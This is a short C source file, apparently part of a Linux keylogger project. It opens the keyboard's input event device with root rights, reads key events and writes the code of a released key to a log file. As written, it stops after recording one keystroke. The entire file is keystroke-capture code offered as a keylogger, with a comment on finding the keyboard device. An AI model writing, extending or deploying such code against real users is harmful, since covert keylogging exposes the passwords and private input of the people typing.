#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <stdlib.h> 
#include "keylog.h"

/*
* Struct input_event defined: /usr/include/linux/input.h
* Input event codes defined: /usr/include/liunx/input-event-codes.h
* Find what event handler keyboard is tied to: cat /proc/bus/input/devices | less
* PROGRGAM MUST BE RUN AS SUDO
*/

void run()
{
	struct input_event ev; 
	FILE   *fp; 
	int     fd; 

	fd = open(KEYBOARD, O_RDONLY);
	fp = fopen(LOGFILE, "w+");
	if (fp == NULL)
	{
		printf("File open error!");
		exit(1); 
	}

	while(1)
	{
		read(fd, &ev, sizeof(ev));
		if ((ev.type == EV_KEY) && (ev.value == 0))
		{
			//printf("%d\n", ev.code);
			fprintf(fp,"%d", ev.code);
			break;
		}
	}

	fclose(fp); 
}    

